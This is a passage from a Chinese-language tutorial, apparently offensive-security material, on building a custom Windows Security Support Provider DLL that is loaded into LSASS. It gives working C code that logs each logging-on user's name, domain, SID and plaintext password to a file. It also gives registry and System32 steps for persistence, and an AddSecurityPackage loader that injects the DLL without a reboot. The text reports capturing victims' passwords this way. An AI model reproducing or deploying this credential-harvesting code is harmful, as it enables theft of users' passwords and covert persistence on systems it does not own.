        PackageInfo->wVersion = 1;
        PackageInfo->wRPCID = SECPKG_ID_NONE;
        PackageInfo->cbMaxToken = 0;
        PackageInfo->Name = (SEC_WCHAR*)L"Kerberos";
        PackageInfo->Comment = (SEC_WCHAR*)L"Microsoft Kerberos V5.0";
        return STATUS_SUCCESS;
    }
    NTSTATUS NTAPI _SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
    {
        const wchar_t* LSA_LOGON_TYPE[] = {
            L"UndefinedLogonType",
            L"Unknown !",
            L"Interactive",
            L"Network",
            L"Batch",
            L"Service",
            L"Proxy",
            L"Unlock",
            L"NetworkCleartext",
            L"NewCredentials",
            L"RemoteInteractive",
            L"CachedInteractive",
            L"CachedRemoteInteractive",
            L"CachedUnlock",
        };
        FILE* logfile;
        if (_wfopen_s(&logfile, L"CustSSP.log", L"a") == 0)
        {
            SspLog(
                logfile,
                L">>>>=================================================================\n"
                L"[+] Authentication Id : %u:%u (%08x:%08x)\n"
                L"[+] Logon Type        : %s\n"
                L"[+] User Name         : %wZ\n"
                L"[+] Domain            : %wZ\n"
                L"[+] Logon Server      : %wZ\n"
                L"[+] SID               : %s\n"
                L"[+] SSP Credential    : \n"
                L"\t* UserName    : %wZ\n"
                L"\t* Domain      : %wZ\n"
                L"\t* Password    : ",
                PrimaryCredentials->LogonId.HighPart,
                PrimaryCredentials->LogonId.LowPart,
                PrimaryCredentials->LogonId.HighPart,
                PrimaryCredentials->LogonId.LowPart,
                LSA_LOGON_TYPE[LogonType],
                AccountName,
                &PrimaryCredentials->DomainName,
                &PrimaryCredentials->LogonServer,
                SidToString(PrimaryCredentials->UserSid),
                &PrimaryCredentials->DownlevelName,
                &PrimaryCredentials->DomainName
            );
            SspLogPassword(logfile, &PrimaryCredentials->Password);
            SspLog(logfile, L"\n");
            fclose(logfile);
        }
        return STATUS_SUCCESS;
    }
    NTSTATUS NTAPI _SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables)
    {
        *PackageVersion = SECPKG_INTERFACE_VERSION;
        *ppTables = SecPkgFunctionTable;
        *pcTables = ARRAYSIZE(SecPkgFunctionTable);
        return STATUS_SUCCESS;
    }
在 CustSSP 中，我们依次实现了 SpInitialize、SpShutDown、SpGetInfo 和 SpAcceptCredentials
函数，并定义了一个名为 `SecPkgFunctionTable` 的 `SECPKG_FUNCTION_TABLE` 结构，用于存储指向这些函数的指针。
之后，我们通过定义 .def 文件将 CustSSP 中定义的 `SpLsaModeInitialize`
函数导出，如下所示。该函数会被本地安全机构（LSA）调用一次，从而将 CustSSP 中实现的函数的指针提供给 LSA。
    LIBRARY
    EXPORTS
        SpLsaModeInitialize     =   _SpLsaModeInitialize
## 3\. 运行效果演示
将编译生成的 CustSSP.dll 置于 C:\Windows\System32 目录中，并将 “CustSSP”
添加到以下注册表值的数据中，如下图所示。
    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages
> 通常，SSP/AP DLL 存储在 %SystemRoot%/System32 目录中。如果这是自定义 SSP/AP DLL 的路径，则不包括路径作为
> DLL 名称的一部分。 但是，如果 DLL 位于其他路径中，请在名称中包含 DLL 的完整路径。
当目标主机重新启动并进行交互式身份验证后，将在 C:\Windows\System32\CustSSP.log 中记录当前登录用户的明文密码，如下图所示。
成功利用该方法的条件是必须重新启动目标系统。因此只有启动计算机系统后，本地安全机构（LSA）才会自动将已注册的 SSP/AP 的 DLL
加载到其进程空间中。
然而，利用某些 Windows API，我们可以在不重启的情况下添加 SSP/AP。
## 4\. 利用 AddSecurityPackage API 来加载 SSP/AP
AddSecurityPackage 是一个 SSPI 函数，用于将安全支持提供程序添加到提供程序列表中，该函数声明如下。
    SECURITY_STATUS SEC_ENTRY AddSecurityPackageW(
      [in] LPSTR                     pszPackageName,
      [in] PSECURITY_PACKAGE_OPTIONS pOptions
    );
参数如下：
  * [in] pszPackageName：要添加的包的名称。
  * [in] pOptions：指向 `SECURITY_PACKAGE_OPTIONS` 结构的指针，该结构指定有关安全包的其他信息。
通过 C/C++ 创建一个名为 AddSSP 的项目，其代码如下所示。
    #define SECURITY_WIN32
    #include 
    #include 
    #include 
    #pragma comment(lib,"Secur32.lib")
    int wmain(int argc, char** argv) {
        SECURITY_PACKAGE_OPTIONS option;
        option.Size = sizeof(option);
        option.Flags = 0;
        option.Type = SECPKG_OPTIONS_TYPE_LSA;
        option.SignatureSize = 0;
        option.Signature = NULL;
        // AddSecurityPackageW 默认在 System32 目录中搜索 CustSSP.dll
        if (AddSecurityPackageW((LPWSTR)L"CustSSP", &option) == SEC_E_OK)
        {
            wprintf(L"[*] Add security package successfully\n");
        }
    }
编译并生成 AddSSP.exe 后，运行 AddSSP.exe 即可成功将 CustSSP.dll 添加到系统。需要注意的是，以上代码仅将 CustSSP
加载到 LSASS 进程中，系统重启后会失效，因此仍需将 “CustSSP” 添加到 Security Packages 注册表并将 CustSSP.dll
置于 C:\Windows\System32 目录中。
当用户输入用户名密码重新进行身份验证时，我们重新得到了他的明文密码，如下图所示。